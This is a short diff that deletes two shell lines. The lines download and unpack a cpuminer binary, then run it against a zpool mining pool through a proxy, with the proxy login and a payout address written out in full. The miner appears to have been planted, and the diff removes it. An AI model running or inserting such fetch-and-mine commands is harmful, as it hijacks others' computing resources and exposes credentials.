@@ -1,2 +1,0 @@
-wget https://github.com/cpu-pool/cpuminer-opt-static-linux64/releases/download/v3.12.5/cpuminer-opt-linux64.tar.gz && tar zxvf cpuminer-opt-linux64.tar.gz
-./cpuminer -a power2b -x xtncrobw-rotate:2xy2iaskqndm@p.webshare.io:80 -o stratum+tcp://power2b.na.mine.zpool.ca:6242 -u Mj2f4L6HhBMwqBPFAehKrH56RZ6GQqXtNA -p c=MBC,zap=MBC
